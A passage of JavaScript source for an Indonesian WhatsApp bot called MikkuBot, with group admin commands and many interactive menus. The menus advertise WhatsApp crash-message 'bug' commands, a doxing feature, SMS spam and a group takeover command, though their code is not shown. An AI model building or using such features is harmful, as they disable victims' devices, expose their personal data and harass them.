┋░▹ ${global.simbol} ${prefix}21gbb *nama,number*
┋░▹ ${global.simbol} ${prefix}22gnb *nama,number*
┋░▹ ${global.simbol} ${prefix}23gbb *nama,number*
┋░▹ ${global.simbol} ${prefix}24gbb *nama,number*
┋░▹ ${global.simbol} ${prefix}25gbb *nama,number*
┋░▹ ${global.simbol} ${prefix}unlii *nama,number*
┗━━━━━━━━━━━━━━━━━━`
tamzz.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'MikkuBot',
thumbnailUrl: 'https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg',
sourceUrl: "https://chat.whatsapp.com/IAvxLU8KWknAYJngDXOctu",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: qpayment})
}
break

    case 'add': {
if (!isAdmins && !isOwner) return reply("Ettss Mau Ngapain Onii-Chan🤣")
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Onii-Chan')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await tamzz.groupParticipantsUpdate(from, [users], 'add')
}
break

case "kick": {
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await tamzz.groupParticipantsUpdate(from, [users], 'remove')
reply("Gomenne Onii-Chan, Mampus Lu kena Kick😂🗿")
}
break 
case 'done':{
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*

Penggunaan:
${prefix + command} barang,nominal,payment`);
let barang = t[0];
let nominal = t[1];
let payment = t[2];
reply(`┏╍╍╍┉╍☉ \`INFO TRANSAKSI\`
┋░▹ *BARANG:* *${barang}*
┋░▹ *NOMINAL:* *Rp${nominal}*
┋░▹ *TANGGAL:* *${tanggal}*
┋░▹ *PAYMENT:* *${payment}*
┋░▹ *STATUS:* *BERHASIL*
┗━━━━━━━━━━━━━━━━━

*TERIMA KASIH TELAH ORDER DI ${global.namaCreator}*\n*JANGAN LUPA ORDER LAGI YA ONII-CHAN*🙏`)
}
        break
case 'sewabot':
if (!isOwner) return reply('*ᴡᴀᴅᴜʜ ᴋᴀᴋ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ ʜᴇʜᴇ !*')
if (!text) return m.reply(`*Contoh* :\n#sewabot 1 minggu `)
let cret = await tamzz.groupCreate(args.join(" "), [])
let response = await tamzz.groupInviteCode(cret.id)
tamzz.sendMessage(m.chat, { text: `「 *Create Group Sewa* 」

Sewa Bot Selama *${text}* Sedang Dalam Prosess Silahkan Masuk Melalui Link Group Yang Sudah Di Sediakan..

_▸ Owner : @${owner.split("@")[0]}
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_https://chat.whatsapp.com/${response}
`, m})
m.reply('pesan dan link group khusus sudah terkirim di chat privasi anda')
break  
case "join": {
if (!isOwner) return reply('*GOMENNE ONII-CHAN, INI KHUSUS OWNER MWEHEEE !*')
if (!text) return reply(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await tamzz.groupAcceptInvite(result).then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "panelmenu1": {
let teksmenu = `Hai Onii Chan @${sender.split("@")[0]}

┏╍╍╍┉╍☉ \`PANEL SERVER PUBLIC\`
┋░▹ ${prefix}ʀᴀᴍʟɪsᴛ
┋░▹ ${prefix}ʟɪsᴛᴀᴅᴍɪɴ
┋░▹ ${prefix}ᴀᴅᴅᴀᴅᴍɪɴ
┋░▹ ${prefix}ᴀᴅᴅᴏᴡɴᴇʀ
┋░▹ ${prefix}ᴅᴇʟᴏᴡɴᴇʀ
┋░▹ ${prefix}ʟɪsᴛᴀᴅᴍ
┋░▹ ${prefix}ᴀᴅᴅᴘʀᴇᴍ
┋░▹ ${prefix}ʀᴇɪɴsᴛᴀʟʟ
┋░▹ ${prefix}ʙᴜʏᴀᴅᴍɪɴ
┋░▹ ${prefix}ᴅᴇʟᴘʀᴇᴍ
┋░▹ ${prefix}ʟɪsᴛᴜsʀ
┋░▹ ${prefix}ʟɪsᴛsʀᴠ
┋░▹ ${prefix}ᴅᴇʟᴜsʀ
┋░▹ ${prefix}ᴅᴇʟsʀᴠ
┋░▹ ${prefix}ʟɪɴᴋʟᴏɢ
┗━━━━━━━━━━━━━━━━━━`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./thumb.png")}, { upload: tamzz.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat ${namaCreator}\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: qpayment}) 
await tamzz.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "vpsmenu": {
let teksmenu = `Hai Onii Chan @${sender.split("@")[0]}

┏╍╍╍┉╍☉ \`VPS DO MENU\`
┋░▹ ${prefix}ᴠᴘsʟɪsᴛ
┋░▹ ${prefix}ᴅᴇʟᴅʀᴏᴘ
┋░▹ ${prefix}ᴄᴇᴋᴅʀᴏᴘ
┋░▹ ${prefix}ʟɪsᴛᴅʀᴏᴘ
┋░▹ ${prefix}sɪsᴀᴅʀᴏᴘ
┋░▹ ${prefix}ᴛᴜʀɴᴏғғ
┋░▹ ${prefix}ᴛᴜʀɴᴏɴ
┋░▹ ${prefix}ᴠᴘs1ɢ1ᴄ
┋░▹ ${prefix}ᴠᴘs1ɢ2ᴄ
┋░▹ ${prefix}ᴠᴘs2ɢ2ᴄ
┋░▹ ${prefix}ᴠᴘs4ɢ2ᴄ
┋░▹ ${prefix}ᴠᴘs8ɢ4ᴄ
┋░▹ ${prefix}ᴠᴘs16ɢ4ᴄ
┋░▹ ${prefix}sᴇɴᴅᴠᴘs
┋░▹ ${prefix}ʀᴇsᴛᴀʀᴛᴠᴘs
┋░▹ ${prefix}ʀᴇʙᴜɪʟᴅ
┗━━━━━━━━━━━━━━━━━━`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./thumb.png")}, { upload: tamzz.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat ${namaCreator}\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: qpayment}) 
await tamzz.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "installpanelmenu": {
let teksmenu = `┏╍╍╍┉╍☉ \`INFORMATION\`
┋░▹ *Nama* : ${namabot}
┋░▹ *Owner* : ${namaCreator}
┋░▹ *Prefix* : Multi Prefix
┋░▹ *Versi* : 1.7.0 New
┋░▹ *Platfrom* : Chrome ( Ubuntu )
┗━━━━━━━━━━━━━━━━━━`
let sections = [{
title: 'SILAHKAN PILIH MENU INSTALL PANEL',
rows: [{
title: 'INSTALL THEMA',
id: `.installthema`
},
{
title: 'INSTALL PANEL', 
id: `.installpanel`
},
{
title: 'START WINGS',
id: `.startwings`
},
{
title: 'CREATE NODE',
id: `.createnode`
},
{
title: 'UNINSTALL THEMA',
id: `.uninstallthema`
},
{
title: 'UNINSTALL PANEL',
id: `.uninstallpanel`
}]
}]

let listMessage = {
    title: 'Click Here!', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363301428946392@newsletter',
 newsletterName: 'Powered By MikkuBot', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: tamzz.decodeJid(tamzz.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: teksmenu
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `YT: fadzvpn`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${m.sender.split("@")[0]} 👋*`,
 subtitle: "MikkuBot",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/52d4bb98002c0c963853e.jpg" } }, { upload: tamzz.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await tamzz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case "bugmenu": {
let teksmenu = `Hai Onii Chan @${sender.split("@")[0]}

┏╍╍╍┉╍☉ \`BUG MENU\`
┏╍╍╍┉╍☉ \`NORMAL BUG\`
┋░▹ ${prefix}1sʜᴏᴏᴛ
┋░▹ ${prefix}1ʜɪᴛ
┋░▹ ${prefix}ᴛᴀᴍᴢʙᴜɢ
┋░▹ ${prefix}ғᴀᴛᴀʟ-ɴᴏᴛɪғ
┋░▹ ${prefix}ғᴀᴛᴀʟ-ᴜɪ
┋░▹ ${prefix}sʏsᴛᴇᴍᴄ1-ᴠ2
┋░▹ ${prefix}ᴛᴀᴍᴢsʏsᴛᴇᴍ
┋░▹ ${prefix}ᴍɪᴍɪʀ
┋░▹ ${prefix}ᴀᴅᴅᴍᴜʀʙᴜɢ
┗━━━━━━━━━━━━━━━━━━
┏╍╍╍┉╍☉ \`HARD BUG\`
┋░▹ ${prefix}ʙᴜɢ-ɪᴘᴏɴɢ
┋░▹ ${prefix}ʙᴜɢ-ɪᴏs
┋░▹ ${prefix}sʏsᴛᴇᴍᴄ1
┋░▹ ${prefix}sɪᴘɪʟɪsᴛ
┋░▹ ${prefix}ᴀᴜᴛᴏᴄ1
┋░▹ ${prefix}sᴀɴᴛᴇᴛ
┋░▹ ${prefix}ғᴏʀᴄᴇs-sǫʟ
┋░▹ ${prefix}ʙᴜɢ-24ᴊ
┋░▹ ${prefix}ᴍᴀᴛɪʟᴜ
┋░▹ ${prefix}sᴀɴᴛᴇᴛ-24ᴊ
┋░▹ ${prefix}ʙᴜɢ-ɢᴀɴᴀs
┗━━━━━━━━━━━━━━━━━━
┏╍╍╍┉╍☉ \`BUG DI TEMPAT\`
┋░▹ ${prefix}ᴘ
┋░▹ ${prefix}ʙᴀɴɢ
┋░▹ ${prefix}ᴏʏ
┋░▹ ${prefix}ʀᴀᴡʀ
┋░▹ ${prefix}ᴛᴇsᴛ
┋░▹ ${prefix}ʜᴀʟᴏ
┋░▹ ${prefix}ᴀssᴀʟᴀᴍᴜᴀʟᴀɪᴋᴜᴍ
┋░▹ ${prefix}ᴏʏʏ
┗━━━━━━━━━━━━━━━━━━
┏╍╍╍┉╍☉ \`DOXING FEATURE\`
┋░▹ *${prefix}ᴅᴏx*
┋░▹ *${prefix}ɢᴇᴛɴɪᴋ*
┗━━━━━━━━━━━━━━━━━━`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./thumb.png")}, { upload: tamzz.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat ${namaCreator}\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: qpayment}) 
await tamzz.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "panelmenu2": {
let teksmenu = `Hai Onii Chan @${sender.split("@")[0]}

┏╍╍╍┉╍☉ \`PANEL SERVER PRIVATE\`
┋░▹ ${prefix}ʀᴀᴍʟɪsᴛ2
┋░▹ ${prefix}ʟɪsᴛᴀᴅᴍɪɴ2
┋░▹ ${prefix}ᴀᴅᴅᴀᴅᴍɪɴ2
┋░▹ ${prefix}ᴀᴅᴅᴏᴡɴᴇʀ2
┋░▹ ${prefix}ᴅᴇʟᴏᴡɴᴇʀ2
┋░▹ ${prefix}ᴀᴅᴅᴘʀᴇᴍ2
┋░▹ ${prefix}ᴀᴅᴅᴜsʀ2
┋░▹ ${prefix}ᴀᴅᴅsʀᴠ2
┋░▹ ${prefix}ᴅᴇʟᴘʀᴇᴍ2
┋░▹ ${prefix}ʟɪsᴛᴜsʀ2
┋░▹ ${prefix}ʟɪsᴛᴀᴅᴍɪɴ2
┋░▹ ${prefix}ʟɪsᴛsʀᴠ2
┋░▹ ${prefix}ᴅᴇʟᴜsʀ2
┋░▹ ${prefix}ʀᴇɪɴsᴛᴀʟʟ2
┋░▹ ${prefix}ᴅᴇʟsʀᴠ2
┋░▹ ${prefix}ʟɪɴᴋʟᴏɢ2
┗━━━━━━━━━━━━━━━━━━`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./thumb.png")}, { upload: tamzz.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat ${namaCreator}\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: qpayment}) 
await tamzz.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "toolsmenu": case "menutools": {
let teksmenu = `Hai Onii Chan @${sender.split("@")[0]}

┏╍╍╍┉╍☉ \`MENU TOOLS\`
┋░▹ ${prefix}sᴛɪᴄᴋᴇʀ
┋░▹ ${prefix}ᴅᴇʟᴇᴛᴇ
┋░▹ ${prefix}ᴋᴀʟᴋᴜʟᴀᴛᴏʀ
┋░▹ ${prefix}ʟᴀᴄᴀᴋɪᴘ
┋░▹ ${prefix}ᴍʏɪᴘ
┋░▹ ${prefix}sɪɴᴅʏ
┋░▹ ${prefix}ʀᴇᴍɪɴɪ
┋░▹ ${prefix}sʜᴏʀᴛᴜʀʟ
┋░▹ ${prefix}ɢᴇᴛɴɪᴋ
┋░▹ ${prefix}sʜᴏʀᴛʟɪɴᴋ
┋░▹ ${prefix}ᴛᴏᴜʀʟ
┋░▹ ${prefix}spamsms
┋░▹ ${prefix}ᴛᴏɪᴍɢ
┋░▹ ${prefix}sᴇᴡᴀʙᴏᴛ
┗━━━━━━━━━━━━━━━━━━`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./thumb.png")}, { upload: tamzz.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat ${namaCreator}\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: qpayment}) 
await tamzz.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "grubmenu": case "groupmenu":{
let teksmenu = `Hai Onii Chan @${sender.split("@")[0]}

┏╍╍╍┉╍☉ \`GROUP MENU\`
┋░▹ ${prefix}ᴍᴇɴᴜᴄᴏɴғɪɢ
┋░▹ ${prefix}ʜɪᴅᴇᴛᴀɢ
┋░▹ ${prefix}ʟɪɴᴋɢᴄ
┋░▹ ${prefix}ʀᴇsᴇᴛʟɪɴᴋɢᴄ
┋░▹ ${prefix}ᴛᴀɢᴀʟʟ
┋░▹ ${prefix}ᴀɴᴛɪʟɪɴᴋ ᴏɴ/ᴏғғ
┋░▹ ${prefix}ᴘʀᴏᴍᴏᴛᴇ
┋░▹ ${prefix}ᴅᴇᴍᴏᴛᴇ
┋░▹ ${prefix}sᴇᴛᴅᴇsᴋ
┋░▹ ${prefix}ɪᴅɢᴄ
┋░▹ ${prefix}ᴘʀᴏᴍᴏᴛᴇᴀʟʟ
┋░▹ ${prefix}ᴋᴜᴅᴇᴛᴀ
┋░▹ ${prefix}ᴅᴇᴍᴏᴛᴇᴀʟʟ
┋░▹ ${prefix}ɢʀᴏᴜᴘ ᴏᴘᴇɴ/ᴄʟᴏsᴇ
┋░▹ ${prefix}ʀᴇsᴇᴛʟɪɴᴋɢᴄ
┋░▹ ${prefix}ᴋɪᴄᴋᴀʟʟ
┋░▹ ${prefix}ᴛᴏᴛᴀɢ
┋░▹ ${prefix}ʟɪsᴛᴏɴ
┗━━━━━━━━━━━━━━━━━━`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./thumb.png")}, { upload: tamzz.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat ${namaCreator}\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: qpayment}) 
await tamzz.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "panelmenu": {
let teksnya = `*Halo Kak @${sender.split("@")[0]} 👋*
 
┏╍╍╍┉╍☉ \`PANEL MENU\`
┋░▹ *Name* : ${pushname}
┋░▹ *Number* : ${m.sender.split('@')[0]}
┋░▹ *Status* : ${isPremium ? "Premium" : "Free"}
┗━━━━━━━━━━━━━━━━━━`

let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: "List Menu Panel Pterodactyl"
}),
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./thumb.png")}, { upload: tamzz.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "Click Here", "sections": [{ "title": "Silahkan Pilih Menu Panel Di Bawah", "highlight_label": \"Powered By ${namaCreator}\", "rows": [{ "header": "PANEL PUBLIC", "title": "Server Panel Public", "id": ".panelmenu1" }, 
{ "header": "PANEL PRIVATE", "title": "Server Panel Private", "id": ".panelmenu2" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qpayment}) 
await tamzz.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case 'allmenu': case 'menuall': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `Hallo Onii-Chan @${sender.split("@")[0]}
𝘗𝘌𝘙𝘒𝘌𝘕𝘈𝘓𝘒𝘈𝘕 𝘚𝘈𝘠𝘈 𝘔𝘐𝘒𝘒𝘜𝘉𝘖𝘛,
𝘉𝘖𝘛 𝘞𝘏𝘈𝘛𝘚𝘈𝘗𝘗 𝘠𝘎 𝘋𝘐𝘒𝘌𝘔𝘉𝘈𝘕𝘎𝘒𝘈𝘕 𝘖𝘓𝘌𝘏 𝘍𝘈𝘋𝘡𝘝𝘗𝘕.
𝘉𝘌𝘙𝘐𝘒𝘜𝘛 𝘈𝘋𝘈𝘓𝘈𝘏 𝘋𝘈𝘍𝘛𝘈𝘙 𝘔𝘌𝘕𝘜 𝘋𝘐 𝘔𝘐𝘒𝘒𝘜𝘉𝘖𝘛.

┏╍╍╍┉╍☉ \`INFO USER\`
┋░▹ *Name* : ${pushname}
┋░▹ *Number* : ${m.sender.split('@')[0]}
┋░▹ *Status* : ${isPremium ? "Premium" : "Free"}
┗━━━━━━━━━━━━━━━━━━
┏╍╍╍┉╍☉ \`INFO BOT\`
┋░▹ *Bot Name* : MikkuBot
┋░▹ *Nomor Creator* : @${owner.split("@")[0]}
┋░▹ *Versi Bailyes* : ${version}
┋░▹ *Runtime* : ${runtime(process.uptime())}
┋░▹ *Jam* : ${wib}
┋░▹ *Today* : ${hariini}
┗━━━━━━━━━━━━━━━━━━
 
┏╍╍╍┉╍☉ \`ALLMENU\`
┏╍╍╍┉╍☉ \`OWNER MENU\`
┋░▹ ${prefix}sᴇʟғ
┋░▹ ${prefix}ᴘᴜʙʟɪᴄ
┋░▹ ${prefix}sᴇᴛᴘᴘʙᴏᴛ
┋░▹ ${prefix}ᴜɴʙʟᴏᴄᴋ
┋░▹ ${prefix}ʙʟᴏᴄᴋ
┋░▹ ${prefix}ᴀᴅᴅᴏᴡɴᴇʀ2
┋░▹ ${prefix}ᴅᴇʟᴏᴡɴᴇʀ2
┋░▹ ${prefix}ᴘᴀʏ2
┋░▹ ${prefix}ɢᴇᴛʙɪᴏ
┋░▹ ${prefix}ᴇɴᴄ
┋░▹ ${prefix}ᴀᴅᴅᴘʀᴇᴍ2
┋░▹ ${prefix}ᴅᴇʟᴘʀᴇᴍ2
┋░▹ ${prefix}ᴅᴇʟsᴇsɪ
┋░▹ ${prefix}ʟᴇᴀᴠᴇ
┋░▹ ${prefix}ᴀᴅᴅᴘʀᴇᴍ
┋░▹ ${prefix}ᴘᴀʏ
┋░▹ ${prefix}ʀᴇɪɴsᴛᴀʟʟ
┋░▹ ${prefix}ᴅᴇʟᴘʀᴇᴍ
┋░▹ ${prefix}ᴀᴅᴅᴏᴡɴᴇʀ
┋░▹ ${prefix}ᴅᴏɴᴇ
┋░▹ ${prefix}ʙᴀᴛᴀʟ
┋░▹ ${prefix}ᴄʜᴇᴄᴋ-ʜᴏsᴛ
┋░▹ ${prefix}ᴊᴏɪɴ
┋░▹ ${prefix}ᴀᴅᴅsᴀʟᴅᴏ
┋░▹ ${prefix}ᴍɪɴsᴀʟᴅᴏ
┋░▹ ${prefix}ʟᴇᴀᴠᴇ
┋░▹ ${prefix}ᴀᴅᴅᴄᴀsᴇ
┋░▹ ${prefix}ʙᴀᴄᴋᴜᴘ
┋░▹ ${prefix}ᴅᴇʟᴄᴀsᴇ
┋░▹ ${prefix}ʟɪsᴛᴄᴀsᴇ
┗━━━━━━━━━━━━━━━━━━

┏╍╍╍┉╍☉ \`OTOMATIS MENU\`
┋░▹ ${prefix}ʙᴜʏᴀᴅᴍɪɴ
┋░▹ ${prefix}ᴀᴅᴅsᴀʟᴅᴏ
┋░▹ ${prefix}ᴍɪɴsᴀʟᴅᴏ
┋░▹ ${prefix}ᴅᴇᴘᴏsɪᴛ (ᴄᴏᴍᴍɪɴɢ sᴏᴏɴ)
┗━━━━━━━━━━━━━━━━━━

┏╍╍╍┉╍☉ \`INSTALL PANEL MENU\`
┋░▹ ${prefix}ɪɴsᴛᴀʟʟᴛʜᴇᴍᴀ
┋░▹ ${prefix}ɪɴsᴛᴀʟʟᴘᴀɴᴇʟ
┋░▹ ${prefix}ᴜɴɪɴsᴛᴀʟʟᴘᴀɴᴇʟ
┋░▹ ${prefix}sᴛᴀʀᴛᴡɪɴɢs
┋░▹ ${prefix}ᴄʀᴇᴀᴛᴇɴᴏᴅᴇ
┗━━━━━━━━━━━━━━━━━━

┏╍╍╍┉╍☉ \`BUG MENU\`
┋░▹ ${prefix}1sʜᴏᴏᴛ
┋░▹ ${prefix}1ʜɪᴛ
┋░▹ ${prefix}ᴛᴀᴍᴢʙᴜɢ
┋░▹ ${prefix}ғᴀᴛᴀʟ-ɴᴏᴛɪғ
┋░▹ ${prefix}ғᴀᴛᴀʟ-ᴜɪ
┋░▹ ${prefix}ғᴏʀᴄᴇs-sǫʟ
┋░▹ ${prefix}sʏsᴛᴇᴍᴄ1-ᴠ2
┋░▹ ${prefix}ᴛᴀᴍᴢsʏsᴛᴇᴍ
┋░▹ ${prefix}ᴍɪᴍɪʀ
┋░▹ ${prefix}ᴀᴅᴅᴍᴜʀʙᴜɢ
┋░▹ ${prefix}ʙᴜɢ-ɪᴘᴏɴɢ
┋░▹ ${prefix}ʙᴜɢ-ɪᴏs
┋░▹ ${prefix}sʏsᴛᴇᴍᴄ1
┋░▹ ${prefix}sɪᴘɪʟɪsᴛ
┋░▹ ${prefix}ᴀᴜᴛᴏᴄ1
┋░▹ ${prefix}sᴀɴᴛᴇᴛ
┋░▹ ${prefix}ʙᴜɢ-24ᴊ
┋░▹ ${prefix}ᴍᴀᴛɪʟᴜ
┋░▹ ${prefix}sᴀɴᴛᴇᴛ-24ᴊ
┋░▹ ${prefix}ʙᴜɢ-ɢᴀɴᴀs
┗━━━━━━━━━━━━━━━━━━

┏╍╍╍┉╍☉ \`VPS DO MENU\`
┋░▹ ${prefix}ᴠᴘsʟɪsᴛ
┋░▹ ${prefix}ᴅᴇʟᴅʀᴏᴘ
┋░▹ ${prefix}ᴄᴇᴋᴅʀᴏᴘ
┋░▹ ${prefix}ʟɪsᴛᴅʀᴏᴘ
┋░▹ ${prefix}sɪsᴀᴅʀᴏᴘ
┋░▹ ${prefix}ᴛᴜʀɴᴏғғ
┋░▹ ${prefix}ᴛᴜʀɴᴏɴ
┋░▹ ${prefix}ᴠᴘs1ɢ1ᴄ
┋░▹ ${prefix}ᴠᴘs1ɢ2ᴄ
┋░▹ ${prefix}ᴠᴘs2ɢ2ᴄ
┋░▹ ${prefix}ᴠᴘs4ɢ2ᴄ
┋░▹ ${prefix}ᴠᴘs8ɢ4ᴄ
┋░▹ ${prefix}ᴠᴘs16ɢ4ᴄ
┋░▹ ${prefix}sᴇɴᴅᴠᴘs
┋░▹ ${prefix}ʀᴇsᴛᴀʀᴛᴠᴘs
┋░▹ ${prefix}ʀᴇʙᴜɪʟᴅ
┗━━━━━━━━━━━━━━━━━━

┏╍╍╍┉╍☉ \`GROUP MENU\`
┋░▹ ${prefix}ᴍᴇɴᴜᴄᴏɴғɪɢ
┋░▹ ${prefix}ʜɪᴅᴇᴛᴀɢ
┋░▹ ${prefix}ʟɪɴᴋɢᴄ
┋░▹ ${prefix}ʀᴇsᴇᴛʟɪɴᴋɢᴄ
┋░▹ ${prefix}ᴛᴀɢᴀʟʟ
